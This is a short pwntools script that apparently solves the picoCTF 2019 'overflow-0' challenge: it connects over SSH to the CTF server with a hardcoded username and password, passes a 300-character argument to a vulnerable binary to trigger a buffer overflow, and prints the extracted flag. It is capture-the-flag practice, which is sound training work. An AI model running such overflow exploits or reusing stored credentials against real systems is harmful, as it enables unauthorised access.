from pwn import *
s=ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
s.set_working_directory(wd=b"/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7")
argument = "Q"*300
p = s.process(["./vuln", argument])
flag = p.recvline().decode("utf-8") # https://stackoverflow.com/questions/606191/convert-bytes-to-a-string
flag = flag.split("{")[1].split("}")[0]
print(flag)
